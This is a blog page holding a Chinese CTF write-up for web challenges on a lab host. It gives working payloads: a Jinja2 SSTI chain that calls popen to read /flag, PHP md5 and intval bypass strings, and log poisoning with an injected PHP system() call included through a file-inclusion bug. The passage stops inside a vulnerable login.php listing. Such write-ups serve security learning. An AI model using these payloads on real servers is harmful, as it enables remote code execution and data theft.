@@ -1,0 +1,1020 @@
+
+  <!DOCTYPE html>
+  <html lang="en"  
+    
+      data-theme-mode="auto"
+    
+  >
+  <head>
+  
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_4k4bc36ef96';window.REIMU_CONFIG.clipboard_tips = {"success":{"en":"Copy successfully (*^▽^*)"},"fail":{"en":"Copy failed (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = 'All articles on this blog are licensed under the BY-NC-SA license agreement unless otherwise stated. Please indicate the source when reprinting!';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://chq576.github.io';</script>
+  
+  <title>
+    玄武杯2025 |
+    
+    江之岛
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  
+  
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_4k4bc36ef96.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="锦家有什么（ssti漏洞） 锦家-&gt;jinjia,猜测可能是有ssti漏洞 使用比较常见的参数?name&#x3D;49,确定有ssti漏洞 用脚本看一下os._wrap_close在哪个位置-&gt;154  123456import requestsfor i in range(500):    url&#x3D;&quot;http:&#x2F;&#x2F;node1.anna.nssctf.cn:23158&#x2F;tr">
+<meta property="og:type" content="article">
+<meta property="og:title" content="玄武杯2025">
+<meta property="og:url" content="https://chq576.github.io/2026/03/11/%E7%8E%84%E6%AD%A6%E6%9D%AF2025/index.html">
+<meta property="og:site_name" content="江之岛">
+<meta property="og:description" content="锦家有什么（ssti漏洞） 锦家-&gt;jinjia,猜测可能是有ssti漏洞 使用比较常见的参数?name&#x3D;49,确定有ssti漏洞 用脚本看一下os._wrap_close在哪个位置-&gt;154  123456import requestsfor i in range(500):    url&#x3D;&quot;http:&#x2F;&#x2F;node1.anna.nssctf.cn:23158&#x2F;tr">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://chq576.github.io/img/jinjia.png">
+<meta property="og:image" content="https://chq576.github.io/img/49.png">
+<meta property="og:image" content="https://chq576.github.io/img/154.png">
+<meta property="og:image" content="https://chq576.github.io/img/%E6%AC%A7%E5%85%8B.png">
+<meta property="og:image" content="https://chq576.github.io/img/555.png">
+<meta property="og:image" content="https://chq576.github.io/img/admin.png">
+<meta property="og:image" content="https://chq576.github.io/img/flag.png">
+<meta property="og:image" content="https://chq576.github.io/img/dd.png">
+<meta property="og:image" content="https://chq576.github.io/img/85.png">
+<meta property="article:published_time" content="2026-03-11T09:21:46.000Z">
+<meta property="article:modified_time" content="2026-03-14T13:06:25.977Z">
+<meta property="article:author" content="cc">
+<meta property="article:tag" content="章鱼哥喜欢海绵宝宝">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://chq576.github.io/img/jinjia.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="江之岛" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload&#x3D;null;this.rel&#x3D;&#39;stylesheet&#39;" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL&#x2F;toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx&#x2F;1oA&#x2F;0l8ysE" crossorigin="anonymous">
+  
+    
+      
+        
+<link rel="stylesheet" href="https://npm.webcache.cn/katex@0.16.24/dist/katex.min.css" integrity="sha384-tTgKLjMYmJr94v8qu2PE5MUGSMbyN2xiH266JUB3gpm8vnnJywd1dWSOEfrFz+YI" crossorigin="anonymous">
+
+      
+    
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+  
+  
+  
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+  <body>
+    
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      
+      
+        
+      
+      <div class="loading-word">Loading...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+    
+      
+        <a class="main-nav-link-wrap" href="/">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <span class="main-nav-link">Home</span>
+        </span>
+      
+        <a class="main-nav-link-wrap" href="/archives">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <span class="main-nav-link">Archives</span>
+        </span>
+      
+        <a class="main-nav-link-wrap" href="/about">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <span class="main-nav-link">About</span>
+        </span>
+      
+        <a class="main-nav-link-wrap" href="/friend">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <span class="main-nav-link">Friend</span>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed" aria-label="RSS Feed" target="_blank"></a>
+    
+    
+  </nav>
+  
+  
+</div>
+<header id="header" aria-label="Site header">
+  
+    
+      
+        <picture></picture>
+        <img crossorigin="anonymous" fetchpriority="high" src="/images/cc.jpg" alt="玄武杯2025">
+      
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <span id="logo">
+            <h1 data-aos="slide-up">玄武杯2025</h1>
+          </span>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content" class="sidebar-left"  >
+          <aside id="sidebar" aria-label="Sidebar">
+  
+  <div class="sidebar-wrapper-container sticky">
+  
+    
+    
+  
+ 
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+  
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%94%A6%E5%AE%B6%E6%9C%89%E4%BB%80%E4%B9%88%EF%BC%88ssti%E6%BC%8F%E6%B4%9E%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">锦家有什么（ssti漏洞）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#normal-php"><span class="toc-number">2.</span> <span class="toc-text">normal_php</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ez-file"><span class="toc-number">3.</span> <span class="toc-text">ez_file</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9C%BC%E8%A7%81%E4%B8%8D%E4%B8%80%E5%AE%9A%E4%B8%BA%E5%AE%9E"><span class="toc-number">4.</span> <span class="toc-text">眼见不一定为实</span></a></li></ol>
+  
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/jn.jpg" data-sizes="auto" alt="cc" class="lazyload">
+  <div class="sidebar-author-name">cc</div>
+  <div class="sidebar-description">章鱼哥喜欢海绵宝宝</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Post</div>
+    <div class="sidebar-state-number">20</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Category</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tag</div>
+    <div class="sidebar-state-number">3</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="Friend"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">Friend</div>
+      </div>
+    
+  
+</div>
+</div>
+        
+      
+      
+        
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+        
+      
+    </div>
+  </div>
+  
+  <div class="sidebar-widget">
+  
+  </div>
+  
+  </div>
+  
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-玄武杯2025" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-03-11T09:21:46.000Z" itemprop="datePublished">2026-03-11</time>
+    <time style="display: none;" id="post-update-time">2026-03-14</time>
+  </span>
+  
+</div>
+
+      
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h1 id="锦家有什么（ssti漏洞）"><a href="#锦家有什么（ssti漏洞）" class="headerlink" title="锦家有什么（ssti漏洞）"></a>锦家有什么（ssti漏洞）</h1><ol>
+<li>锦家-&gt;jinjia,猜测可能是有ssti漏洞<br><img src="/./img/jinjia.png" alt="图片"></li>
+<li>使用比较常见的参数?name&#x3D;49,确定有ssti漏洞<br><img src="/./img/49.png" alt="图片"></li>
+<li>用脚本看一下os._wrap_close在哪个位置-&gt;154</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">for i in range(500):</span><br><span class="line">    url=&quot;http://node1.anna.nssctf.cn:23158/try_a_try?name=&#123;&#123;%27%27.__class__.__base__.__subclasses__()[&quot;+str(i)+&quot;]&#125;&#125;&quot;</span><br><span class="line">    r=requests.get(url=url)</span><br><span class="line">    if &#x27;os._wrap_close&#x27; in r.text:</span><br><span class="line">        print(i)</span><br></pre></td></tr></table></figure>
+<p><img src="/./img/154.png" alt="图片"><br>4. 用脚本看一下popen在不在</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=&quot;http://node1.anna.nssctf.cn:23158/try_a_try?name=&#123;&#123;%27%27.__class__.__base__.__subclasses__()[154].__init__.__globals__&#125;&#125;&quot;</span><br><span class="line">r=requests.get(url=url)</span><br><span class="line">if &#x27;popen&#x27; in r.text:</span><br><span class="line">    print(&quot;ok&quot;)</span><br></pre></td></tr></table></figure>
+<p><img src="/./img/%E6%AC%A7%E5%85%8B.png" alt="图片"><br>5. </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node1.anna.nssctf.cn:23158/try_a_try?name=&#123;&#123;%27%27.__class__.__base__.__subclasses__()[154].__init__.__globals__[%27popen%27](%27cat%20/flag%27).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="normal-php"><a href="#normal-php" class="headerlink" title="normal_php"></a>normal_php</h1><p>1. </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"> <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"> <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);<span class="comment">//关闭所有php错误提示，避免泄露敏感信息</span></span><br><span class="line"> <span class="keyword">include</span> <span class="string">&#x27;next.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">     <span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">     <span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">     <span class="title function_ invoke__">parse_str</span>(<span class="variable">$a</span>,<span class="variable">$b</span>);<span class="comment">// 把a参数的字符串按&quot;key=value&amp;key2=value2&quot;格式解析到数组$b中</span></span><br><span class="line">     <span class="keyword">if</span>(<span class="variable">$b</span>[<span class="string">&#x27;cdusec&#x27;</span>]!==<span class="variable">$c</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>[<span class="string">&#x27;cdusec&#x27;</span>])==<span class="title function_ invoke__">md5</span>(<span class="variable">$c</span>))&#123;</span><br><span class="line">         <span class="variable">$num1</span>=<span class="variable">$b</span>[<span class="string">&#x27;num&#x27;</span>][<span class="number">0</span>];</span><br><span class="line">         <span class="variable">$num2</span>=<span class="variable">$b</span>[<span class="string">&#x27;num&#x27;</span>][<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="number">10520</span>,<span class="variable">$b</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="string">&quot;记住这个数&quot;</span>;</span><br><span class="line">             <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">         &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">             <span class="keyword">die</span>(<span class="string">&quot;这都记不住?&quot;</span>);</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$num2</span>==<span class="number">114514</span>)&#123;</span><br><span class="line">             <span class="keyword">die</span>(<span class="string">&quot;我不想要这个数字!&quot;</span>);</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num2</span>))&#123;</span><br><span class="line">             <span class="keyword">die</span>(<span class="string">&quot;还想十六进制绕过?&quot;</span>);</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$num2</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">             <span class="keyword">die</span>(<span class="string">&quot;还想八进制绕过?&quot;</span>);</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num2</span>,<span class="number">0</span>)==<span class="number">114514</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="string">&quot;好了你可以去下一关了&quot;</span>.<span class="variable">$next</span>;</span><br><span class="line">         &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="string">&quot;我现在又想要了,嘻嘻&quot;</span>;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">     &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">&quot;不er,md5你不会&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;你看看传什么呢&quot;</span>;</span><br><span class="line"> &#125; 你看看传什么呢</span><br></pre></td></tr></table></figure>
+<ul>
+<li>$b[‘cdusec’]!&#x3D;&#x3D;$c &amp;&amp; md5($b[‘cdusec’])&#x3D;&#x3D;md5($c)。$b[‘cdusec’]和$c必须<strong>严格不等</strong>，$b[‘cdusec’]和$c的MD5哈希值若比较相等，这个可以考虑到0e开头的哈希值或者数组绕过，$b[‘cdusec’]&#x3D; “QNKCDZO”;$c &#x3D; “240610708”;</li>
+<li>in_array(10520,$b[‘num’])：$b[‘num’]必须是数组，且至少有一个元素是 10520。所以num[0]&#x3D;10520</li>
+<li>$num2弱比较下不能等于 114514，但intval($num2,0)&#x3D;&#x3D;114514又要求转换后等于 114514，不可以使用十六进制和八进制绕过<br>所以num[1]&#x3D;114514.1</li>
+</ul>
+<ol start="2">
+<li>构造payload</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?a=cdusec=QNKCDZO&amp;num[0]=10520&amp;num[1]=114514.1（不行）</span><br><span class="line">c=240610708</span><br><span class="line">?a=cdusec%3D240610708%26num%5B0%5D%3D10520%26num%5B1%5D%3D0337522（可以）</span><br></pre></td></tr></table></figure>
+<p><img src="/./img/555.png" alt="图片"><br>3. </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">#flag在/flag中，试着读读?</span></span><br><span class="line"></span><br><span class="line"> <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);<span class="comment">//出现错误不提示，避免泄露敏感信息</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]))&#123;</span><br><span class="line">     <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">     <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|php|filter|base64|text|read|resource|\=|\&#x27;|\&quot;|\,/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">         <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+<p>发现文件包含漏洞，但是用正则匹配函数过滤了很多危险词<br>先上传一个并不存在的文件&#x2F;<?php system("cat /flag");?>—URL编码，该内容可以在错误日志里面出现，然后<br>?filename&#x3D;&#x2F;var&#x2F;log&#x2F;apache2&#x2F;error.log，这样就可以触发文件包含，执行日志里面的恶意代码</p>
+<blockquote>
+<p>常见的日志路径<br>&#x2F;var&#x2F;log&#x2F;apache&#x2F;access.log<br>&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log<br>&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p>
+</blockquote>
+<h1 id="ez-file"><a href="#ez-file" class="headerlink" title="ez_file"></a>ez_file</h1><p>目录扫描<br>login.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#悄悄的，校内赛道第一个找到学长的秘密的私信学长秘密内容给奶茶喝</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();<span class="comment">//保存状态的函数,启动php里的session会话机制，用于存储用户登录后的角色信息（admin/guest)</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">#header(&#x27;Content-Type: application/json&#x27;);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$params</span> = [];</span><br><span class="line"><span class="variable">$role</span> = <span class="string">&quot;guest&quot;</span>;</span><br><span class="line"><span class="variable">$admin_role</span> = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;CONTENT_TYPE&quot;</span>] , <span class="string">&quot;application/json&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="comment">//请求头包含application/json</span></span><br><span class="line">    <span class="variable">$raw</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);<span class="comment">//读取post请求的原始数据</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$raw</span>, <span class="literal">true</span>);<span class="comment">//将 JSON 字符串解析为 PHP 关联数组</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">json_last_error</span>() === JSON_ERROR_NONE) &#123;</span><br><span class="line">        <span class="variable">$params</span> = <span class="variable">$data</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$params</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="variable">$$key</span> = <span class="variable">$value</span>;<span class="comment">//变量覆盖漏洞</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;Invalid JSON&quot;</span>]);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 如果是普通表单请求</span></span><br><span class="line"><span class="keyword">elseif</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] === <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] ;</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] ;</span><br><span class="line"><span class="comment">//    $params = [&#x27;username&#x27; =&gt; $username, &#x27;password&#x27; =&gt; $password];</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;Unsupported request method&quot;</span>]);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$client_ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] ;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$username</span> === <span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="variable">$password</span> === <span class="string">&quot;456789&quot;</span> &amp;&amp; <span class="variable">$client_ip</span> === <span class="string">&quot;127.0.0.1&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;role&#x27;</span>] = <span class="variable">$admin_role</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">        <span class="string">&quot;status&quot;</span> =&gt; <span class="string">&quot;success&quot;</span>,</span><br><span class="line">        <span class="string">&quot;message&quot;</span> =&gt; <span class="string">&quot;Login successful (local admin)&quot;</span>,</span><br><span class="line">        <span class="string">&quot;ip&quot;</span> =&gt; <span class="variable">$client_ip</span></span><br><span class="line">    ]);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$username</span> === <span 